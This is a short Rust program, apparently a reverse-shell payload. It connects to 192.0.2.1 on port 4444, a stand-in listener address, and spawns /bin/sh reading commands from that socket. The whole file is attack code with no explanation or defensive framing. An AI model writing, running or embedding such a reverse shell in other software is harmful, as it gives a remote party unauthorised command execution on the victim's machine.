use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
fn main() {
    let s = TcpStream::connect("192.0.2.1:4444").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh").stdin(unsafe { Stdio::from_raw_fd(fd) }).spawn().unwrap();
}
